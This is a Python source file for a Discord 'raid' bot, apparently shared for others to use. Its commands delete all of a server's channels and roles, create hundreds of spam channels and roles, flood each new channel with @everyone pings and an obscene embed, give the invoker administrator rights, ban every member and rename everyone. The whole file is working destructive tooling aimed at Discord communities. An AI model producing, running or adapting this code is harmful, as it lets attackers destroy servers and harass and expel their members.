import discord
from discord.ext import commands
from discord.ext.commands import bot
import colorama
from colorama import Fore
import random

token = "your_token"

colors = {"main": Fore.RED,
          "white": Fore.WHITE,
          "red": Fore.RED}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['red']}{colors['main']}>>{colors['red']}",
        "pressenter": f"{colors['red']}[{colors['main']}i{colors['red']}] Press ENTER to exit"}
        
intents = discord.Intents.all()
intents.members=True
bot = commands.Bot(command_prefix = ">", intents=intents)
bot.remove_command("help")
with open('image.png', 'rb') as f:
        icon = f.read()

@bot.event
async def on_ready():
 await bot.change_presence(status=discord.Status.dnd, activity=discord.Game('?'))    
 print(f'''

 ▄▄▄       ██ ▄█▀▓█████ ▓█████  ██▓    
▒████▄     ██▄█▒ ▓█   ▀ ▓█   ▀ ▓██▒    
▒██  ▀█▄  ▓███▄░ ▒███   ▒███   ▒██░    
░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ▒▓█  ▄ ▒██░    
 ▓█   ▓██▒▒██▒ █▄░▒████▒░▒████▒░██████▒
 ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░░░ ▒░ ░░ ▒░▓  ░
  ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░ ░ ░  ░░ ░ ▒  ░
  ░   ▒   ░ ░░ ░    ░      ░     ░ ░   
      ░  ░░  ░      ░  ░   ░  ░    ░  ░
                                       

>bot creado por ᴀᶻᵏᵉᵉˡ
>Gracias por usar mi codigo
comandos :           >raid >mr >dr 
                     >admin >banall >nc >dc
prefix: >    
                                 by azkeel''')

spam=("@everyone spam"
     )
@bot.event
async def on_guild_channel_create(channel):
 for i in range(0,15):
   embed=discord.Embed(title="Fucked By servername", color=discord.Color.darker_grey())
   embed.set_image(url="https://i.pinimg.com/originals/70/e7/e3/70e7e3acc945029b238bc2e62e7c8647.gif")
   await channel.send(spam,embed=embed)
   
@bot.command()
async def raid(ctx):
 nombre = "!Fυƈƙҽԃ"
 await ctx.message.delete()
 await ctx.guild.edit(name = '!Fυƈƙҽԃ By spamname',icon=icon)
 for channel in ctx.guild.channels:
  try:
   await channel.delete()
   print(f"{msgs['+']} canal eliminado")
  except:   
   pass
 for i in range(0, 500):
       await ctx.guild.create_text_channel(nombre)
       print(f"{msgs['+']} canal creado")
 
@bot.command(name="mr")
async def RolMasivo(ctx, amount: int = 247, *, name="!Fυƈƙҽԃ"):
    await ctx.message.delete()
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name, color=discord.Color.darker_grey())
            print(f"{msgs['+']} rol creado")
        except:
            print(f"{msgs['error']} no se pudo crear el rol")               
       
@bot.command(name='dr')
async def EliminarRoles(ctx):
    await ctx.message.delete()
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} rol eliminado: {r}")
        except:
            print(f"{msgs['error']} no se pudo eliminar el rol: {r}")

@bot.command(name="admin")
async def admin(ctx, *, rolename="Azkeel"):
    await ctx.message.delete()
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} se le dio admin a {ctx.message.author}")
    except:
    	pass

@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
            try:
                await m.ban()
                print(f"{msgs['+']} member baneado: {m}")
            except:
            	pass
            
@bot.command()
async def nc(ctx, *, name="?"):
    await ctx.message.delete()
    for m in ctx.guild.members:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} nick puesto a  {m}'s ")
            except:
            	pass

@bot.command()
async def help(ctx):
        author = ctx.author
        embedVar = discord.Embed(title="comandos", color=0xff0000)
        embedVar.add_field(name="Raid", value= '''```raid(crea canales + ping)
mr(roles masivos)
dr(eliminar roles)
admin(te da administrador)
banall(banea a todos los usuarios) 
nc(cambia el nombre de todos)```''', inline = False)
        embedVar.set_image(url="https://c.tenor.com/lsPwkez1CooAAAAC/lucii-block6.gif")
        embedVar.set_footer(text=f"ByNinjabrine")
        await ctx.send(embed=embedVar)
             
bot.run(token)
